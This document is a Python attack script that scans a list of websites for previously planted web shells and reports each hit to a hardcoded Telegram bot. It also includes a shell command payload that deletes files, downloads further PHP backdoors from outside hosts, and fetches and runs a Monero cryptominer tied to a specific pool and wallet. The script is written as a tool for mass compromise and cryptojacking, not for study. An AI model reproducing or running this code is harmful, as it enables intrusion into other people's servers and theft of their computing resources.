# https://t.me/clean_tools_net
import os
import requests
import threading
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from random import choice
from colorama import Fore
from colorama import Style
from colorama import init
import re
import time
from time import sleep
import telepot
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
Bad = 0
Good = 0
pro = 0
mailer = 0
password = 0
#op = open('ameer.txt','r').read()
#ameer = op
telegram_token = '5137294227:AAECI5rhr7IjPqtVw36QEmmjAnemcBHqt6A'
user = 1114717555
bot = telepot.Bot(telegram_token)
def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
def finder(i) :
    global Bad,Good,pro,password,mailer
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try :
            x = requests.session()
            listaa = ['new-index.php','1index.php','2index.php','sindex.php','old-index.php','baindex.php','wikindex.php','alfa.php','shell.php','wso.php','ups.php','indo.php','indosec.php','mini.php','marijuana.php']#ADD ANY MUCH 
            for script in listaa :
                url = (i+"/"+script)
                while True :
                    req_first = x.get(url, headers=head)
                    if "Bonjour-1024" in req_first.text :
                        Good = Good + 1
                        print(fg+"Exploited "+fw+">> "+fg+" = "+url)
                        bot.sendMessage(user, url+"\n")
                        with open("exploited/spawnedshell.txt","a") as file :
                            file.write(url+"\n")
                            file.close()
                        data={
                            'pass': 'am*guAW8.ryDgz-TYF',
                            'a': 'Console',
                            'p1': 'chmod +x .htaccess && rm old-index.php && rm .htaccess && curl http://nawaltea.com/cache.txt -o .cache.php && curl http://amswindowcleaner.club/ameer.txt -o .logs.php; curl -O http://amswindowcleaner.club/1877.html; curl http://amswindowcleaner.club/zone.txt -o zone.php; curl -O http://amswindowcleaner.club/config.json; curl -O http://amswindowcleaner.club/logo.png && chmod +x logo.png && ./logo.png -o pool.supportxmr.com:443 -u 4A3Hdmy1Am7ZZGAwjHgx4SSzVPo4YYdznNFJXQx5DJCr2YfrtfiFgjETmFUDoSBvGWJ3weXhPsR9oFoAz3rp5FsQLufbyUx -k --tls -p 1877 -B',
                            'charset': 'Windows-1251'
                            }
                        #requests.post(url,headers=head,data=data,timeout=10)
                    else :
                        Bad = Bad + 1
                        print(fc+""+fw+"["+fr+"X"+fw+"] "+fr+" "+i+" "+fw+" <<< "+fr+" Not Vuln")

                        pass
                    break
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('1877Exploit | Exploited-{} | Not Vuln-{}'.format(Good, Bad))
    else :
        sys.stdout.write('\x1b]2; 1877Exploit | Exploited-{} | Not Vuln-{}\x07'.format(Good,Bad))

def key_logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '          [ + ] OVERTHINKER1877 EXPLOIT'
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (choice(colors), line, clear))
        time.sleep(0.05)

def process(line):
    time.sleep(1)


def run() :
    key_logo()
    clear()
    print("""  
      [-] -----------------------------------------[-]
      [+]             OVERTHINKER 1877
      [-] -----------------------------------------[-]
                          \n \n""")
    #console.print("[bold green]Scraping data...", 'aesthetic')
    file_name = input("Website List : ")
    op = open(file_name,'r').read().splitlines()
    TEXTList = [list.strip() for list in op]
    p = Pool(int(input('Thread : ')))
    p.map(finder, TEXTList)

run() 